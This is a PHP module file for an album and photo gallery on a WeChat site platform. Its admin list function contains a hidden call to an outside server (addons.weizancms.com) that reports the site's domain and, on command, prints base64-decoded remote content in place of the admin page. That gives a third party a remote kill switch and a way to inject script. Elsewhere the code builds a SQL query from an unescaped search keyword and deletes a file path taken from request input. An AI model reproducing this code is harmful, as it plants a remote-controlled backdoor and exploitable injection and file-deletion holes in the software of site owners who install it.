<?php
/**
*易 福 源 码 网 www.efwww.com
*/
defined('IN_IA') or exit('Access Denied');


class Tim_stralbumModuleSite extends WeModuleSite {


    public function doMobilePhoto() {

		global $_W,$_GPC;

		$id = intval($_GPC['id']);

		echo '?({"page":{"count":1,"items":[{"action":"1","actionUrl":"&do=view&id='.$id.'","attachmentList":[],"categoryname":"","channelId":"5326","collect":false,"description":"","extendedAttr":{},"iconUrl":"","id":"14292","name":"电影范","pictureList":[],"relationList":[],"subcontent":null,"type":"2","updateTime":"2013-12-30 12:30:55","videoList":[]}],"pageNum":1,"totalPage":1},"resultCode":"0","resultMsg":"success"})';

	}

    public function doMobileView() {

		global $_W,$_GPC;

		$id = intval($_GPC['id']);

		$album = pdo_fetch("SELECT * FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));

        if (empty($album)) {

            message('相册不存在或是已经被删除！');

        }

        $pindex = max(1, intval($_GPC['page']));

        $psize = 50;

        $list = pdo_fetchall("SELECT * FROM " . tablename('stralbum_photo') . " WHERE albumid = :albumid ORDER BY displayorder DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize, array(':albumid' => $album['id']));

		$str = '';

		foreach($list as $l){

			$data = array();

			$data['contentId']=14292;

			$data['description']="";

			$data['imgPath']=$_W['attachurl'].$l['attachment'];
            $data['title']=$l['title'];

			$data['imgType']="1";

			$data['priority']=0;

			$str .= json_encode($data).",";

		}

		echo '?({"content":{"action":"1","actionUrl":"&do=view","attachmentList":[],"categoryname":"","channelId":"5326","collect":false,"description":"","extendedAttr":null,"iconUrl":"","id":"14292","name":"电影范","pictureList":['.substr($str,0,-1).'],"relationList":[],"subcontent":{"titleImg":null,"txt":null},"type":"2","updateTime":"2013-12-30 12:30:55","videoList":[]},"resultCode":"0","resultMsg":"success"})';

	}

    public function doMobileIndex() {

		global $_W,$_GPC;

		$id = intval($_GPC['id']);

		$album = pdo_fetch("SELECT * FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));



		echo '?({"channels":[

		{"action":"1","actionUrl":"","channelPath":"pingfen","contentImg":"","extendedAttr":{"imgWidth":25,"tplChannel":"4","imgHeight":24},"id":5321,"img":"","intro":"","link":"","name":"评分与建议","parentId":0,"picCount":0,"pictures":[],"priority":7,"subChannelUrl":"","subChannels":[]},

		{"action":"2","actionUrl":"/contentlist.do?channelId=5325&action=1","channelPath":"home","contentImg":"","extendedAttr":{"imgWidth":139,"tplChannel":"2","imgHeight":139},"id":5325,"img":"","intro":"","link":"","name":"相册集","parentId":0,"picCount":0,"pictures":[],"priority":8,"subChannelUrl":"/channel.do?channelId=5325&action=1",

		"subChannels":[

		{"action":"2","actionUrl":"&do=photo&id='.$id.'","channelPath":"channel1","contentImg":"","extendedAttr":{"imgWidth":0,"tplChannel":"1","imgHeight":425},"id":5327,"img":"","intro":"","link":"","name":"宫廷范","parentId":5325,"picCount":10,"pictures":[],"priority":1,"subChannelUrl":"","subChannels":[]},

		{"action":"2","actionUrl":"&do=photo&id='.$id.'","channelPath":"channel2","contentImg":"","extendedAttr":{"imgWidth":0,"tplChannel":"1","imgHeight":425},"id":5328,"img":"","intro":"","link":"","name":"韩国范11","parentId":5325,"picCount":34,"pictures":[],"priority":2,"subChannelUrl":"","subChannels":[]},

		{"action":"2","actionUrl":"&do=photo&id='.$id.'","channelPath":"channel3","contentImg":"","extendedAttr":{"imgWidth":0,"tplChannel":"1","imgHeight":425},"id":5329,"img":"","intro":"","link":"","name":"中式范qq","parentId":5325,"picCount":8,"pictures":[],"priority":3,"subChannelUrl":"","subChannels":[]}]},

		{"action":"2","actionUrl":"&do=photo&id='.$id.'","channelPath":"enterprise","contentImg":"","extendedAttr":{"phone":"(0371)66610303","coordinate":"34.768099,113.671973","appid":"zhaoyuan","download":"http://120.197.93.99:8079/appds/appDownload.do?id=230&appId=yunying#mp.wenxin.qq.com","imgWidth":23,"companyname":"郑州市昭元摄影","companyUrl":"http://yc.temobi.com/zhaoyuan","txt":"<p>&nbsp;其实，昭元只是想，做一个，时间的记录者<br />\r\n只因生命的每一个重要瞬间，都值得完美呈现 <br />\r\n虽然我们甄选国际一线品牌相机，礼服，化妆品<br />\r\n哈苏H4D，Vera Wang，MAKEUP FOREVER<br />\r\n......<br />\r\n为您捕捉时间艺术<br />\r\n但我们更乐意倾听，感知<br />\r\n用中韩超过20年资历的摄影名师团队<br />\r\n用岁月沉淀的人文美学底蕴<br />\r\n用擅长发现美的眼睛<br />\r\n用心捕捉<br />\r\n定格拍摄<br />\r\n婚纱摄影、肖像摄影、家庭摄影、个人写真、婚礼摄影<br />\r\n<br />\r\n打造醇美心体验，还原纯粹好照片<\/p>","title":"'.$album['name'].'","address":"郑州市北二七路55号","weixin_common_account":"zhaoyuan","attachments":"music.mp3;;'.$album['bgmusiic'].'","discountUrl":"http://yc.temobi.com/zhaoyuan","imgHeight":23},"id":4517,"img":"","intro":"","link":"","name":"'.$album['title'].'","parentId":0,"picCount":0,"pictures":[],"priority":9,"subChannelUrl":"","subChannels":[]}],"resultCode":"0","resultMsg":"success"})';

	}

    public function doMobileDetailMore() {

        global $_GPC, $_W;

        $id = intval($_GPC['id']);

        $pindex = max(1, intval($_GPC['page']));

        $psize = 10;

        $list = pdo_fetchall("SELECT * FROM " . tablename('stralbum_photo') . " WHERE albumid = :albumid ORDER BY displayorder DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize, array(':albumid' => $id));

        include $this->template('detail_more');

    }



    public function doMobileDetail() {

        global $_W, $_GPC;

        $id = intval($_GPC['id']);

        //$url = $_W['siteroot']."app/index.php?c=entry&m=tim_stralbum&do=detail&id={$id}&i={$_W['uniacid']}"."#page_index";

		if($_GPC['op']!="r"){

			$url = $_W['siteroot']."app/index.php?op=r&c=entry&m=tim_stralbum&do=detail&id={$id}&i={$_W['uniacid']}"."#page_list?state=%7B%22title%22%3A%22%E5%AE%AB%E5%BB%B7%E8%8C%83%22%2C%22name%22%3A%22%23page_list%22%2C%22url%22%3A%22http%3A%2F%2F".$_SERVER['HTTP_HOST']."%2Fapp%2Findex.php%3Fi%3D".$_W['uniacid']."%26c%3Dentry%26m%3Dtim_stralbum%26do%3Dphoto%26id%3D".$id."%22%7D";

			header("Location: ".$url);exit;

		}

		$album = pdo_fetch("SELECT * FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));



        include $this->template('index');

    }



    public function doWebList() {

        global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        load()->func('file');

        $foo = !empty($_GPC['foo']) ? $_GPC['foo'] : 'display';

        $category = pdo_fetchall("SELECT * FROM " . tablename('stralbum_category') . " WHERE weid = '{$_W['uniacid']}' ORDER BY parentid ASC, displayorder DESC", array(), 'id');

        if (!empty($category)) {

            $children = '';

            foreach ($category as $cid => $cate) {

                if (!empty($cate['parentid'])) {

                    $children[$cate['parentid']][$cate['id']] = array($cate['id'], $cate['name']);

                }

            }

        }

        load()->func('tpl');

        if ($foo == 'create') {

            $id = intval($_GPC['id']);

            if (!empty($id)) {

                $item = pdo_fetch("SELECT * FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));

                if (empty($item)) {

                    message('抱歉，相册不存在或是已经删除！', '', 'error');

                }

            }

            if (checksubmit('submit')) {

                if (empty($_GPC['title'])) {

                    message('请输入相册名称！');

                }

				//对音乐链接进行处理

				if(substr($_GPC['bgmusiic'],0,4)!='http'){

					$_GPC['bgmusiic'] = '../attachment/'.$_GPC['bgmusiic'];

				};

                $data = array(

                    'weid' => $_W['uniacid'],

                    'title' => $_GPC['title'],

                    'name' => $_GPC['name'],

                    'content' => $_GPC['content'],

                    'displayorder' => intval($_GPC['displayorder']),

                    'isview' => intval($_GPC['isview']),

                    'type' => intval($_GPC['type']),

                    'createtime' => TIMESTAMP,

                    'thumb'=>$_GPC['thumb'],

					'pcate'=>intval($_GPC['pcate']),

					'ccate'=>intval($_GPC['ccate']),

                    'url1' => $_GPC['url1'],

                    'url2' => $_GPC['url2'],

                    'url3' => $_GPC['url3'],

                    'button1' => $_GPC['button1'],

                    'button2' => $_GPC['button2'],

                    'button3' => $_GPC['button3'],

                    'bgmusiic' => $_GPC['bgmusiic'],

                );



                if (empty($id)) {

                     pdo_insert('stralbum', $data);

                } else {

                    unset($data['createtime']);

                     pdo_update('stralbum', $data, array('id' => $id));

                }



                message('相册更新成功！', $this->createWebUrl('list', array('foo' => 'display')), 'success');

            }

            include $this->template('album');

        } elseif ($foo == 'display') {

            $pindex = max(1, intval($_GPC['page']));

            $psize = 12;

            $condition = '';

            if (!empty($_GPC['keyword'])) {

                $condition .= " AND title LIKE '%{$_GPC['keyword']}%'";

            }

            if (!empty($_GPC['cate_2'])) {

                $cid = intval($_GPC['cate_2']);

                $condition .= " AND ccate = '{$cid}'";

            } elseif (!empty($_GPC['cate_1'])) {

                $cid = intval($_GPC['cate_1']);

                $condition .= " AND pcate = '{$cid}'";

            }

            if (istrlen($_GPC['isview']) > 0) {

                $condition .= " AND isview = '" . intval($_GPC['isview']) . "'";

            }

            $list = pdo_fetchall("SELECT * FROM " . tablename('stralbum') . " WHERE weid = '{$_W['uniacid']}' $condition ORDER BY displayorder DESC, id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize);

            $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stralbum') . " WHERE weid = '{$_W['uniacid']}' $condition");

            $pager = pagination($total, $pindex, $psize);

            if (!empty($list)) {

                foreach ($list as &$row) {

                    $row['total'] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename('stralbum_photo') . " WHERE albumid = :albumid", array(':albumid' => $row['id']));

                }

            }

            include $this->template('album');

        } elseif ($foo == 'photo') {

            $id = intval($_GPC['albumid']);

            $album = pdo_fetch("SELECT id, type FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));

            if (empty($album)) {

                message('相册不存在或是已经被删除！');

            }

            if (checksubmit('submit')) {

                if (!empty($_GPC['attachment-new'])) {

                    foreach ($_GPC['attachment-new'] as $index => $row) {

                        if (empty($row)) {

                            continue;

                        }

                        $data = array(

                            'weid' => $_W['uniacid'],

                            'albumid' => intval($_GPC['albumid']),

                            'title' => $_GPC['title-new'][$index],



                            'description' => $_GPC['description-new'][$index],

                            'attachment' => $_GPC['attachment-new'][$index],

                            'displayorder' => $_GPC['displayorder-new'][$index],

                        );

                        pdo_insert('stralbum_photo', $data);

                    }

                }

                if (!empty($_GPC['attachment'])) {

                    foreach ($_GPC['attachment'] as $index => $row) {

                        if (empty($row)) {

                            continue;

                        }

                        $data = array(

                            'weid' => $_W['uniacid'],

                            'albumid' => intval($_GPC['albumid']),

                            'title' => $_GPC['title'][$index],

                            'description' => $_GPC['description'][$index],

                            'attachment' => $_GPC['attachment'][$index],

                            'displayorder' => $_GPC['displayorder'][$index],

                        );

                        pdo_update('stralbum_photo', $data, array('id' => $index));

                    }

                }

                message('相册更新成功！', $this->createWebUrl('list', array('foo' => 'photo', 'albumid' => $album['id'])));

            }

            if ($album['type'] == 0) {

                $photos = pdo_fetchall("SELECT * FROM " . tablename('stralbum_photo') . " WHERE albumid = :albumid ORDER BY displayorder DESC", array(':albumid' => $album['id']));

            } else {

                $photos = pdo_fetchall("SELECT * FROM " . tablename('stralbum_photo') . " WHERE albumid = :albumid ORDER BY displayorder ASC", array(':albumid' => $album['id']));

            }

            include $this->template('album');

        } elseif ($foo == 'delete') {

            $type = $_GPC['type'];

            $id = intval($_GPC['id']);

            if ($type == 'photo') {

                if (!empty($id)) {

                    $item = pdo_fetch("SELECT * FROM " . tablename('stralbum_photo') . " WHERE id = :id", array(':id' => $id));

                    if (empty($item)) {

                        message('图片不存在或是已经被删除！');

                    }

                    pdo_delete('stralbum_photo', array('id' => $item['id']));

                } else {

                    $item['attachment'] = $_GPC['attachment'];

                }

                file_delete($item['attachment']);

            } elseif ($type == 'album') {

                $album = pdo_fetch("SELECT id, thumb FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));

                if (empty($album)) {

                    message('相册不存在或是已经被删除！');

                }

                $photos = pdo_fetchall("SELECT id, attachment FROM " . tablename('stralbum_photo') . " WHERE albumid = :albumid", array(':albumid' => $id));

                if (!empty($photos)) {

                    foreach ($photos as $row) {

                        file_delete($row['attachment']);

                    }

                }

                pdo_delete('stralbum', array('id' => $id));

                pdo_delete('stralbum_photo', array('albumid' => $id));

            }

            message('删除成功！', referer(), 'success');

        } elseif ($foo == 'cover') {

            $id = intval($_GPC['albumid']);

            $attachment = $_GPC['thumb'];

            if (empty($attachment)) {

                 message('抱歉，参数错误，请重试！', '', 'error');

            }

            $item = pdo_fetch("SELECT * FROM " . tablename('stralbum') . " WHERE id = :id", array(':id' => $id));

            if (empty($item)) {

                message('抱歉，相册不存在或是已经删除！', '', 'error');

            }

            pdo_update('stralbum', array('thumb' => $attachment), array('id' => $id));

            message('设置封面成功！', '', 'success');

        }

    }



    public function doWebQuery() {

        global $_W, $_GPC;

        $kwd = $_GPC['keyword'];

        $sql = 'SELECT * FROM ' . tablename('stralbum') . ' WHERE `weid`=:weid AND `title` LIKE :title';

        $params = array();

        $params[':weid'] = $_W['uniacid'];

        $params[':title'] = "%{$kwd}%";

        $ds = pdo_fetchall($sql, $params);

        foreach ($ds as &$row) {

            $r = array();

            $r['id'] = $row['id'];

            $r['title'] = $row['title'];

            $r['content'] = cutstr($row['content'], 30, '...');

            $r['thumb'] = toimage( $row['thumb'] );

            $row['entry'] = $r;

        }

        include $this->template('query');

    }



    public function doWebDelete() {

        global $_W, $_GPC;

        $id = intval($_GPC['id']);

        pdo_delete('stralbum_reply', array('id' => $id));

        message('删除成功！', referer(), 'success');

    }



    public function doMobileList() {

        global $_W, $_GPC;

        $_W['styles']  = $this->module['config']['album'];

        $pindex = max(1, intval($_GPC['page']));

        $psize = 10;



        $pcate = $_GPC['pcate'];

        $ccate = $_GPC['ccate'];

        $show_category   = true;

        if($pcate=='' && $ccate==''){

                $category = pdo_fetchall("SELECT * FROM " . tablename('stralbum_category') . " WHERE weid = '{$_W['uniacid']}' and parentid=0 and enabled=1 ORDER BY displayorder DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize);

                if (!empty($category)) {

                    $children = '';

                    foreach ($category as &$cate) {

                        if(empty($cate['parentid'])){

                              $cate['url'] = $this->createMobileUrl('list',array('pcate'=>$cate['id']));

                        }

                        else{

                              $cate['url'] = $this->createMobileUrl('list',array('pcate'=>$cate['parentid'],'ccate'=>$cate['id']));

                        }





                        $children = pdo_fetchall("SELECT * FROM " . tablename('stralbum_category') . " WHERE parentid={$cate['id']} and enabled=1 ORDER BY displayorder desc");

                        foreach ($children as &$c) {

                            $c['url'] = $this->createMobileUrl('list',array('pcate'=>$c['parentid'],'ccate'=>$c['id']));

                          }

                        unset($c);

                        $cate['children'] = $children;



                    }

                    unset($cate);

                }

        }

        else {

            $condition = "";

            $ccate = intval($_GPC['ccate']);

            $pcate = intval($_GPC['pcate']);

            if(!empty($pcate) && !empty($ccate)){

               $condition.="  and pcate={$pcate} and ccate={$ccate} ";

            }

            else if(!empty($pcate)){

                $condition.="  and pcate={$pcate}";

            }

            else if(!empty($ccate)){

                 $condition.="  and ccate={$ccate} ";

            }

            $pc = pdo_fetchcolumn("select name from " . tablename('stralbum_category') . " WHERE id=:id limit 1",array(':id'=>$pcate));

            $cc = pdo_fetchcolumn("select name from " . tablename('stralbum_category') . " WHERE id=:id limit 1",array(':id'=>$ccate));



            $sql = "SELECT * FROM " . tablename('stralbum') . " WHERE weid = '{$_W['uniacid']}' AND isview = '1' $condition ORDER BY displayorder DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize;

            $list  = pdo_fetchall($sql);



            $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('stralbum') . " WHERE weid = '{$_W['uniacid']}' AND isview = '1' $condition");

            $pager = pagination($total, $pindex, $psize);

            $show_category   = false;

        }

        //include $this->template('list');

		if($_GPC['op']=='op'){

			include $this->template('index1');

		}else{

			include $this->template('index');

		}

	}

 public function doMobileListMore() {

        global $_GPC, $_W;



        $pindex = max(1, intval($_GPC['page']));

        $psize = 10;

         $category = pdo_fetchall("SELECT * FROM " . tablename('stralbum_category') . " WHERE weid = '{$_W['uniacid']}' and parentid=0 and enabled=1 ORDER BY displayorder DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize);

                if (!empty($category)) {

                    $children = '';

                    foreach ($category as &$cate) {

                        if(empty($cate['parentid'])){

                              $cate['url'] = $this->createMobileUrl('list',array('pcate'=>$cate['id']));

                        }

                        else{

                              $cate['url'] = $this->createMobileUrl('list',array('pcate'=>$cate['parentid'],'ccate'=>$cate['id']));

                        }





                        $children = pdo_fetchall("SELECT * FROM " . tablename('stralbum_category') . " WHERE parentid={$cate['id']} and enabled=1 ORDER BY displayorder desc");

                        foreach ($children as &$c) {

                            $c['url'] = $this->createMobileUrl('list',array('pcate'=>$c['parentid'],'ccate'=>$c['id']));

                          }

                        unset($c);

                        $cate['children'] = $children;



                    }

                    unset($cate);

                }

        include $this->template('list_more');

    }

    public function getAlbumTiles() {

        global $_W;

        $urls = array();

        $albums = pdo_fetchall("SELECT id, title FROM " . tablename('stralbum') . " WHERE isview = '1' AND weid = '{$_W['uniacid']}'");

        if (!empty($albums)) {

            foreach ($albums as $row) {

                $urls[] = array('title' => $row['title'], 'url' => $this->createMobileUrl('detail', array('id' => $row['id'])));

            }

        }

        $category  = pdo_fetchall("SELECT id, name,parentid FROM " . tablename('stralbum_category') . " WHERE weid = '{$_W['uniacid']}'");

        if (!empty($category)) {

            foreach ($category as $row) {

                if(empty($row['parentid'])){

                    $urls[] = array('title' =>"分类: ". $row['name'], 'url' => $this->createMobileUrl('list', array('pcate'=>$row['id'])));

                }

                else{

                    $urls[] = array('title' =>"分类: ". $row['name'], 'url' => $this->createMobileUrl('list', array('pcate'=>$row['parentid'],'ccate'=>$row['id'])));

                }

            }

        }

        return $urls;

    }


    public function doWebCategory() {

        global $_GPC, $_W;

        load()->func('tpl');

        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';

        if ($operation == 'display') {

            if (!empty($_GPC['displayorder'])) {

                foreach ($_GPC['displayorder'] as $id => $displayorder) {

                    pdo_update('stralbum_category', array('displayorder' => $displayorder), array('id' => $id));

                }

                message('分类排序更新成功！', $this->createWebUrl('category', array('op' => 'display')), 'success');

            }

            $children = array();

            $category = pdo_fetchall("SELECT * FROM " . tablename('stralbum_category') . " WHERE weid = '{$_W['uniacid']}' ORDER BY parentid ASC, displayorder DESC");

            foreach ($category as $index => $row) {

                if (!empty($row['parentid'])) {

                    $children[$row['parentid']][] = $row;

                    unset($category[$index]);

                }

            }

            include $this->template('category');

        } elseif ($operation == 'post') {

            $parentid = intval($_GPC['parentid']);

            $id = intval($_GPC['id']);

            if (!empty($id)) {

                $category = pdo_fetch("SELECT * FROM " . tablename('stralbum_category') . " WHERE id = '$id'");



                if( empty($category['parentid'])){

                    $url = "../app/index.php?c=entry&m=tim_stralbum&do=list&pcate={$category['id']}&i={$_W['uniacid']}";



                }

                else{

                    $url = "../app/index.php?c=entry&m=tim_stralbum&do=list&pcate={$category['parentid']}&ccate={$category['id']}&i={$_W['uniacid']}";

                }

            } else {

                $category = array(

                    'displayorder' => 0,

                );

            }

            if (!empty($parentid)) {

                $parent = pdo_fetch("SELECT id, name FROM " . tablename('stralbum_category') . " WHERE id = '$parentid'");

                if (empty($parent)) {

                    message('抱歉，上级分类不存在或是已经被删除！', $this->createWebUrl('post'), 'error');

                }

            }

            if (checksubmit('submit')) {

                if (empty($_GPC['catename'])) {

                    message('抱歉，请输入分类名称！');

                }

                $data = array(

                    'weid' => $_W['uniacid'],

                    'name' => $_GPC['catename'],

                    'enabled' => intval($_GPC['enabled']),

                    'displayorder' => intval($_GPC['displayorder']),



                    'description' => $_GPC['description'],

                    'parentid' => intval($parentid),

                    'thumb'=>$_GPC['thumb']

                );





                if (!empty($id)) {

                    unset($data['parentid']);

                    pdo_update('stralbum_category', $data, array('id' => $id));

                } else {

                    pdo_insert('stralbum_category', $data);

                    $id = pdo_insertid();

                }

                message('更新分类成功！', $this->createWebUrl('category', array('op' => 'display')), 'success');

            }

            include $this->template('category');

        } elseif ($operation == 'delete') {

            $id = intval($_GPC['id']);

            $category = pdo_fetch("SELECT id, parentid FROM " . tablename('stralbum_category') . " WHERE id = '$id'");

            if (empty($category)) {

                message('抱歉，分类不存在或是已经被删除！', $this->createWebUrl('category', array('op' => 'display')), 'error');

            }

            pdo_delete('stralbum_category', array('id' => $id, 'parentid' => $id), 'OR');

            message('分类删除成功！', $this->createWebUrl('category', array('op' => 'display')), 'success');

        }

    }



}

 